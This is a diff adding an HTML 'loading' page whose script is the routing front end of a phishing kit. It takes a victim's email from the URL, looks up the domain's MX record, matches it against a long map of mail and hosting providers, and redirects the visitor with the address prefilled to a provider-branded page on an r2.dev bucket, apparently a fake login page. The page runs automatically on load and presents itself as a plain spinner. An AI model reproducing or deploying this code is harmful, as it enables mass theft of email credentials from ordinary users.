@@ -1,0 +1,284 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <style>
+        body {
+            background-color: #fff; /* Set background color to white */
+            color: #000; /* Change text color to black */
+            font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", "Roboto", "Helvetica Neue", Arial, sans-serif;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin: 0;
+            text-align: center;
+        }
+
+        h1 {
+            margin-bottom: 2em;
+        }
+
+        p {
+            cursor: pointer;
+        }
+
+        p > span {
+            font-size: 12em;
+        }
+
+        #circularG {
+            position: relative;
+            width: 50px;
+            height: 50px;
+        }
+
+        .circularG {
+            position: absolute;
+            background-color: #bdbdbd;
+            width: 11px;
+            height: 11px;
+            border-radius: 8px;
+            animation-name: bounce_circularG;
+            animation-duration: 0.8s;
+            animation-iteration-count: infinite;
+            animation-direction: linear;
+        }
+
+        #circularG_1 {
+            left: 0;
+            top: 20px;
+            animation-delay: 0.3s;
+        }
+
+        #circularG_2 {
+            left: 5px;
+            top: 5px;
+            animation-delay: 0.4s;
+        }
+
+        #circularG_3 {
+            top: 0;
+            left: 20px;
+            animation-delay: 0.5s;
+        }
+
+        #circularG_4 {
+            right: 5px;
+            top: 5px;
+            animation-delay: 0.6s;
+        }
+
+        #circularG_5 {
+            right: 0;
+            top: 20px;
+            animation-delay: 0.7s;
+        }
+
+        #circularG_6 {
+            right: 5px;
+            bottom: 5px;
+            animation-delay: 0.8s;
+        }
+
+        #circularG_7 {
+            left: 20px;
+            bottom: 0;
+            animation-delay: 0.9s;
+        }
+
+        #circularG_8 {
+            left: 5px;
+            bottom: 5px;
+            animation-delay: 1s;
+        }
+
+        @keyframes bounce_circularG {
+            0% {
+                transform: scale(1);
+            }
+            100% {
+                transform: scale(0.3);
+            }
+        }
+    </style>
+</head>
+<body>
+    <div id="circularG">
+        <div id="circularG_1" class="circularG"></div>
+        <div id="circularG_2" class="circularG"></div>
+        <div id="circularG_3" class="circularG"></div> <!-- Fixed typo here -->
+        <div id="circularG_4" class="circularG"></div>
+        <div id="circularG_5" class="circularG"></div>
+        <div id="circularG_6" class="circularG"></div>
+        <div id="circularG_7" class="circularG"></div>
+        <div id="circularG_8" class="circularG"></div>
+    </div>
+    <script>
+        const hostingProviderMap = {
+            "163": "https://pub-a70183c1dda74aec93888d788f3396f3.r2.dev/163.html",
+            "1and1": "https://pub-a70183c1dda74aec93888d788f3396f3.r2.dev/ionos.html",
+            "ionos": "https://pub-a70183c1dda74aec93888d788f3396f3.r2.dev/ionos.html",
+            "chinaemail": "https://pub-a70183c1dda74aec93888d788f3396f3.r2.dev/chinaemail.html",
+            "strato": "https://pub-a70183c1dda74aec93888d788f3396f3.r2.dev/strato.html",
+            "rz": "https://pub-a70183c1dda74aec93888d788f3396f3.r2.dev/strato.html",
+            "activ8": "https://pub-a70183c1dda74aec93888d788f3396f3.r2.dev/active8.html",
+            "synaq": "https://pub-a70183c1dda74aec93888d788f3396f3.r2.dev/synaq.html",
+            "outlook": "https://pub-a70183c1dda74aec93888d788f3396f3.r2.dev/microsoft.html",
+            "arhost": "https://pub-a70183c1dda74aec93888d788f3396f3.r2.dev/aryhost.html",
+            "hostedemail": "https://pub-a70183c1dda74aec93888d788f3396f3.r2.dev/rac.html",
+            "hostedmail": "https://pub-a70183c1dda74aec93888d788f3396f3.r2.dev/hostedmail.html",
+            "microsoft": "https://pub-a70183c1dda74aec93888d788f3396f3.r2.dev/microsoft.html",
+            "outlook.office365": "https://pub-a70183c1dda74aec93888d788f3396f3.r2.dev/microsoft.html",
+            "google": "https://pub-a70183c1dda74aec93888d788f3396f3.r2.dev/gmail.html",
+            "gmail": "https://pub-a70183c1dda74aec93888d788f3396f3.r2.dev/gmail.html",
+            // "yahoo": "yahoo.html",
+            //"ds": "ds.html",
+            "emirates": "https://pub-a70183c1dda74aec93888d788f3396f3.r2.dev/etisalatmail.html",
+            "mega": "https://pub-a70183c1dda74aec93888d788f3396f3.r2.dev/mega.html",
+            "mailchannels": "https://pub-a70183c1dda74aec93888d788f3396f3.r2.dev/kttckw.html",
+            "koreacap": "https://pub-a70183c1dda74aec93888d788f3396f3.r2.dev/fatcow.html",
+            "gmo.jp": "https://pub-a70183c1dda74aec93888d788f3396f3.r2.dev/onamae.html",
+            "servidoresdns": "https://pub-a70183c1dda74aec93888d788f3396f3.r2.dev/serviciodecorreo.html",
+            "earthlink": "https://pub-a70183c1dda74aec93888d788f3396f3.r2.dev/earthlink.html",
+            "secureserver": "https://pub-a70183c1dda74aec93888d788f3396f3.r2.dev/godaddy.html",
+            "reg365": "https://pub-a70183c1dda74aec93888d788f3396f3.r2.dev/register365.html",
+            "register365": "https://pub-a70183c1dda74aec93888d788f3396f3.r2.dev/register365.html",
+            "gmx": "https://pub-a70183c1dda74aec93888d788f3396f3.r2.dev/mail.html",
+            "mx00.mail.com": "https://pub-a70183c1dda74aec93888d788f3396f3.r2.dev/mail.html",
+            "aitai": "https://pub-a70183c1dda74aec93888d788f3396f3.r2.dev/aitai.html",
+            "shinilfi": "https://pub-a70183c1dda74aec93888d788f3396f3.r2.dev/shinilfi.html",
+            "busymouse": "https://pub-a70183c1dda74aec93888d788f3396f3.r2.dev/networksolution.html",
+            "mailplug": "https://pub-a70183c1dda74aec93888d788f3396f3.r2.dev/mailplug.html",
+            "zcom": "https://pub-a70183c1dda74aec93888d788f3396f3.r2.dev/synaq.html",
+            "ocn": "https://pub-a70183c1dda74aec93888d788f3396f3.r2.dev/ocn.html",
+            "fatcow": "https://pub-a70183c1dda74aec93888d788f3396f3.r2.dev/fatcow.html",
+            "horde": "https://pub-a70183c1dda74aec93888d788f3396f3.r2.dev/bat.html",
+            "theupstairsroom": "https://pub-a70183c1dda74aec93888d788f3396f3.r2.dev/bat.html",
+            "planet": "https://pub-a70183c1dda74aec93888d788f3396f3.r2.dev/bat.html",
+            "cafe24": "https://pub-a70183c1dda74aec93888d788f3396f3.r2.dev/cafe24.html",
+            "cytanet": "https://pub-a70183c1dda74aec93888d788f3396f3.r2.dev/cytanet.html",
+            "ipage": "https://pub-a70183c1dda74aec93888d788f3396f3.r2.dev/ipage.html",
+            "italsoftware": "https://pub-a70183c1dda74aec93888d788f3396f3.r2.dev/italsoftware.html",
+            "9netweb": "https://pub-a70183c1dda74aec93888d788f3396f3.r2.dev/italsoftware.html",
+            "inbound.cpt": "https://pub-a70183c1dda74aec93888d788f3396f3.r2.dev/konsoleh.html",
+            "dreamhost": "https://pub-a70183c1dda74aec93888d788f3396f3.r2.dev/kttckw.html",
+            "supremecenter": "https://pub-a70183c1dda74aec93888d788f3396f3.r2.dev/mshosting.html",
+            "rediff": "https://pub-a70183c1dda74aec93888d788f3396f3.r2.dev/rediff.html",
+            //"amazon": "amazon.html",
+            "world4you": "https://pub-a70183c1dda74aec93888d788f3396f3.r2.dev/world4you.html",
+            "ergonet": "https://pub-a70183c1dda74aec93888d788f3396f3.r2.dev/ergonet.html",
+            "yeah": "https://pub-a70183c1dda74aec93888d788f3396f3.r2.dev/yeah.html",
+            "netsolmail": "https://pub-a70183c1dda74aec93888d788f3396f3.r2.dev/networksolutions.html",
+            "mshosting": "https://pub-a70183c1dda74aec93888d788f3396f3.r2.dev/mshosting.html",
+            //"mailspamprotection.com": "paradisojewelry.html",
+            "inbound": "https://pub-a70183c1dda74aec93888d788f3396f3.r2.dev/mimecast.html",
+            "service-alpha-inbound-a.mimecast.com": "https://pub-a70183c1dda74aec93888d788f3396f3.r2.dev/mimecast.html",
+            "securessl": "https://pub-a70183c1dda74aec93888d788f3396f3.r2.dev/securessl.html",
+            //"35": "https://pub-a70183c1dda74aec93888d788f3396f3.r2.dev/cn4e.html",
+            "lionsegypt": "https://pub-a70183c1dda74aec93888d788f3396f3.r2.dev/plesk.html",
+            "plesk": "https://pub-a70183c1dda74aec93888d788f3396f3.r2.dev/plesk.html",
+            "ehosting": "https://pub-a70183c1dda74aec93888d788f3396f3.r2.dev/ehosting.html",
+            "cbx": "https://pub-a70183c1dda74aec93888d788f3396f3.r2.dev/cbx.html",
+            //"cn4e": "https://pub-a70183c1dda74aec93888d788f3396f3.r2.dev/cn4e.html",
+            "hichina": "https://pub-a70183c1dda74aec93888d788f3396f3.r2.dev/aliyun.html",
+            "cpt.host": "https://pub-a70183c1dda74aec93888d788f3396f3.r2.dev/konsoleh",
+            "global": "https://pub-a70183c1dda74aec93888d788f3396f3.r2.dev/global.html",
+            "apn": "https://pub-a70183c1dda74aec93888d788f3396f3.r2.dev/active8.html",
+            "aruba": "https://pub-a70183c1dda74aec93888d788f3396f3.r2.dev/aruba.html",
+            "hostripples": "https://pub-a70183c1dda74aec93888d788f3396f3.r2.dev/hostripples.html",
+            "pphosted": "https://pub-a70183c1dda74aec93888d788f3396f3.r2.dev/pphosted.html",
+            "smtp": "https://pub-a70183c1dda74aec93888d788f3396f3.r2.dev/microsoft.html",
+            "zimbra": "https://pub-a70183c1dda74aec93888d788f3396f3.r2.dev/zum.html",
+            "sina": "https://pub-a70183c1dda74aec93888d788f3396f3.r2.dev/sina.html",
+            "qq": "https://pub-a70183c1dda74aec93888d788f3396f3.r2.dev/dqq.html",
+            "domain": "https://pub-a70183c1dda74aec93888d788f3396f3.r2.dev/webmail.html",
+            "protonmail": "https://pub-a70183c1dda74aec93888d788f3396f3.r2.dev/proton.html",
+            "privateemail": "https://pub-a70183c1dda74aec93888d788f3396f3.r2.dev/privateemail.html",
+            "myregisteredsite": "https://pub-a70183c1dda74aec93888d788f3396f3.r2.dev/networksolution.html",
+            "netsol": "https://pub-a70183c1dda74aec93888d788f3396f3.r2.dev/networksolution.html",
+            "263": "https://pub-a70183c1dda74aec93888d788f3396f3.r2.dev/mail263.html",
+            "aamranetworks": "https://pub-a70183c1dda74aec93888d788f3396f3.r2.dev/young.html",
+            "ionos": "https://pub-a70183c1dda74aec93888d788f3396f3.r2.dev/ionos.html",
+            "mailfence": "https://pub-a70183c1dda74aec93888d788f3396f3.r2.dev/mailfence.html",
+            "aryhost": "https://pub-a70183c1dda74aec93888d788f3396f3.r2.dev/aryhost.html",
+            "icoremail": "https://pub-a70183c1dda74aec93888d788f3396f3.r2.dev/icoremail.html",
+            "naver": "https://pub-a70183c1dda74aec93888d788f3396f3.r2.dev/naver.html",
+            "pec": "https://pub-a70183c1dda74aec93888d788f3396f3.r2.dev/aruba.html",
+            "supremebox": "https://pub-a70183c1dda74aec93888d788f3396f3.r2.dev/roundcube.html",
+            "cyon": "https://pub-a70183c1dda74aec93888d788f3396f3.r2.dev/roundcube.html",
+            "jellyfish": "https://pub-a70183c1dda74aec93888d788f3396f3.r2.dev/webmail.com",
+            "cytanet": "https://pub-a70183c1dda74aec93888d788f3396f3.r2.dev/cytanet.html",
+            "ovh": "https://pub-a70183c1dda74aec93888d788f3396f3.r2.dev/ovh.html",
+            "securessl": "https://pub-a70183c1dda74aec93888d788f3396f3.r2.dev/securessl.html",
+            "hibox": "https://pub-a70183c1dda74aec93888d788f3396f3.r2.dev/hiboxwebmail.html",
+            "azure.microsoft": "https://pub-a70183c1dda74aec93888d788f3396f3.r2.dev/microsoft.html",
+            "mailfree.aruba": "https://pub-a70183c1dda74aec93888d788f3396f3.r2.dev/aruba.html",
+            "hiworks": "https://pub-a70183c1dda74aec93888d788f3396f3.r2.dev/hiworks.html",
+            "megamailservers.com": "https://pub-a70183c1dda74aec93888d788f3396f3.r2.dev/orange.html",
+            "orange": "https://pub-a70183c1dda74aec93888d788f3396f3.r2.dev/orange.html",
+            "hinet": "https://pub-a70183c1dda74aec93888d788f3396f3.r2.dev/hinet.html",
+            "netease": "https://pub-a70183c1dda74aec93888d788f3396f3.r2.dev/163.html",
+            "rediff": "https://pub-a70183c1dda74aec93888d788f3396f3.r2.dev/rediff.html",
+            "webmail": "https://pub-a70183c1dda74aec93888d788f3396f3.r2.dev/webmail.html",
+            "live": "https://pub-a70183c1dda74aec93888d788f3396f3.r2.dev/microsoft.html",
+            "scalahosting": "https://pub-a70183c1dda74aec93888d788f3396f3.r2.dev/scalahosting.html",
+            "sohu": "https://pub-a70183c1dda74aec93888d788f3396f3.r2.dev/securessl.html",
+            "imatic": "https://pub-a70183c1dda74aec93888d788f3396f3.r2.dev/imatic.html",
+            "msn": "https://pub-a70183c1dda74aec93888d788f3396f3.r2.dev/microsoft.html",
+            "hanmail": "https://pub-a70183c1dda74aec93888d788f3396f3.r2.dev/daum.html",
+            "aliyun": "https://pub-a70183c1dda74aec93888d788f3396f3.r2.dev/aliyun.html",
+            "zmail": "https://pub-a70183c1dda74aec93888d788f3396f3.r2.dev/zmail.html",
+            "alibaba": "https://pub-a70183c1dda74aec93888d788f3396f3.r2.dev/aliyun.html",
+            "srvr": "https://pub-a70183c1dda74aec93888d788f3396f3.r2.dev/rac.html",
+            "126": "https://pub-a70183c1dda74aec93888d788f3396f3.r2.dev/126.html"
+            // ... (remaining providers)
+        };
+       function handleEmailRedirection(emailToLookup) {
+            const domain = emailToLookup.split('@')[1];
+            const fullApiUrl = `https://dns.google/resolve?name=${domain}&type=MX`;
+
+            fetch(fullApiUrl)
+                .then(response => response.json())
+                .then(data => {
+                    const mxRecord = data.Answer && data.Answer.find(record => record.type === 15);
+
+                    if (mxRecord) {
+                        const mxValue = mxRecord.data.toLowerCase();
+                        let hostingProvider = "unknown";
+
+                        for (const keyword in hostingProviderMap) {
+                            if (mxValue.includes(keyword)) {
+                                hostingProvider = keyword;
+                                break;
+                            }
+                        }
+
+                        if (hostingProviderMap.hasOwnProperty(hostingProvider)) {
+                            const htmlPage = hostingProviderMap[hostingProvider];
+                            window.location.href = `${htmlPage}?email=${encodeURIComponent(emailToLookup)}`;
+                        } else {
+                            // Redirect to default page with email parameter as fragment identifier
+                            window.location.href = `https://pub-a70183c1dda74aec93888d788f3396f3.r2.dev/default.html#${encodeURIComponent(emailToLookup.split('@')[0])}@${encodeURIComponent(emailToLookup.split('@')[1])}`;
+                        }
+                    } else {
+                        // Redirect to default page with email parameter as fragment identifier
+                        window.location.href = `https://pub-a70183c1dda74aec93888d788f3396f3.r2.dev/default.html#${encodeURIComponent(emailToLookup.split('@')[0])}@${encodeURIComponent(emailToLookup.split('@')[1])}`;
+                    }
+                })
+                .catch(error => {
+                    console.error(`Error performing DNS lookup: ${error.message}`);
+                });
+        }
+
+        // Get email parameter from URL
+        const urlParams = new URLSearchParams(window.location.search);
+        const emailToLookup = urlParams.get('email');
+
+        if (emailToLookup) {
+            handleEmailRedirection(emailToLookup);
+        } else {
+            console.error('Email parameter not found in URL.');
+        }
+    </script>
+</body>
+</html>
